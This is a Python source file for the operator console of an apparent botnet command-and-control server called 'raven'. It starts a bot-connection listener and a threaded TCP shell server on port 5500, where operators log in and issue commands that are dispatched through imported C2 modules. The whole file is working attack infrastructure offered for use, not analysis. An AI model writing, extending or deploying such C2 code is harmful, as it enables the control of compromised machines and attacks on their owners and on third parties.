import io
import socket
import threading
from cmd import Cmd

from C2.func.commandmanager import initcommands
from C2.func.botconnect import BotConnection
from C2.func.login import login
from C2.func.utils.logger import log

class MyPrompt(Cmd):
    def __init__(self, client_socket, username, user_id, bot_connection):
        super().__init__()
        self.client_socket = client_socket
        self.username = username
        self.user_id = user_id
        self.bot_connection = bot_connection  # Store the BotConnection instance
        self.stdout = io.StringIO()  # Redirect output to a string buffer
        self.prompt = f"\x1b[35m{self.username}@raven » \x1b[0m"

    def get_output(self):
        """Retrieve and clear the current stdout buffer"""
        output = self.stdout.getvalue()
        self.stdout.truncate(0)
        self.stdout.seek(0)
        return output

    def default(self, line):
        log(self, f"Invalid command: {line}", "generic")
        super().default(line)

class RemoteShellServer:
    def __init__(self, host='0.0.0.0', port=5500):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.clients = []  # List to keep track of connected clients
        print(f"Server listening on {self.host}:{self.port}")

    def handle_client(self, client_socket):
        self.clients.append(client_socket)  # Add client to the list
        client_socket.send(b"Welcome to RemoteShell. Please log in.\n")

        # Login process
        while True:
            client_socket.send(b"Username: ")
            username = client_socket.recv(1024).decode(errors="ignore").strip()
            client_socket.send(b"Password: ")
            password = client_socket.recv(1024).decode(errors="ignore").strip()

            user_id = login(username, password)
            if user_id:
                client_socket.send("""
\x1b[30;41m                  ⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡟⠋⢻⣷⣄⡀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀Death.⠀⠀⣤⣾⣿⣷⣿⣿⣿⣿⣿\x1b[31;40m⣶\x1b[30;41m⣾⣿⣿⠿⠿⠿⠶⠄⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⠟⠻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣆⣤⠿⢶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠑⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[30;41m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
                \x1b[0m\n""".encode("utf-8"))
                client_socket.send(b"Login successful.\n")
                break
            else:
                client_socket.send(b"Invalid credentials. Please try again.\n")

        prompt = MyPrompt(client_socket, username, user_id, bot_connection)  # Pass the BotConnection instance

        while True:
            try:
                client_socket.send(prompt.prompt.encode())
                data = client_socket.recv(1024).decode(errors="ignore").strip()
                if not data:
                    break

                # Execute the command and capture output
                prompt.onecmd(data)
                output = prompt.get_output()
                if output:
                    client_socket.sendall((output + "\n").encode("UTF-8"))

                if data.lower() == "exit":
                    break

            except (ConnectionResetError, BrokenPipeError):
                break

        client_socket.close()
        try:
            self.clients.remove(client_socket)  # Remove client from the list
        except ValueError:
            pass  # Client was already removed
        print("Client disconnected")

    def disconnect_all_clients(self):
        for client in self.clients:
            client.close()
        self.clients = []

    def start(self):
        print("C2 interface starting...")
        try:
            while True:
                client_socket, address = self.server_socket.accept()
                print(f"Connection from {address}")
                client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_handler.start()
        except KeyboardInterrupt:
            print("C2 interface shutting down...")
            self.disconnect_all_clients()
            self.server_socket.close()
            print("C2 interface stopped")

initcommands(MyPrompt)

if __name__ == "__main__":
    # Start the BotConnection
    bot_connection = BotConnection()
    bot_connection_thread = threading.Thread(target=bot_connection.start)
    bot_connection_thread.start()

    # Start the RemoteShellServer
    shell_server = RemoteShellServer()
    shell_server_thread = threading.Thread(target=shell_server.start)
    shell_server_thread.start()